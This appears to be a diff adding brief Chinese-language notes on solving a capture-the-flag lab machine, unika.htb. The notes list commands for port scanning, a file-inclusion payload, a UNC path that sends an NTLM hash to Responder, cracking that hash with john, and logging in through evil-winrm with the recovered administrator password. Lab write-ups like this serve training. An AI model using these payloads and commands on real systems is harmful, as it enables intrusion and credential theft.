@@ -1,0 +1,22 @@
+1. nmap默认扫描只有80端口
+
+2. 全端口扫描：80，5985,7680
+
+3. 浏览器访问80端口报错，尝试抓包，跳转http://unika.htb/
+
+4. 修改/etc/hosts 文件，指定域名unika.htb的ip地址，成功访问
+
+5. 观察页面，page存在 文件包含漏洞
+    page=../../../../../../../../windows/system32/drivers/etc/hosts
+
+6. 文件包含漏洞 结合 WinRM的5985http端口，利用Responder获取NTLM Hash
+    http://unika.htb/?page=//10.129.90.122/somefile
+    sudo responder -I tun0
+
+7. Join破解密码
+    john -w=/usr/share/wordlists/rockyou.txt /usr/share/responder/logs/SMB-***.txt
+
+8. 连接WinRM，获取flag
+    evil-winrm -i 10.129.136.91 -u administrator -p badminton
+    常用命令：dir，cd，type；
+    C:\Users\mike\Desktop\flag.txt
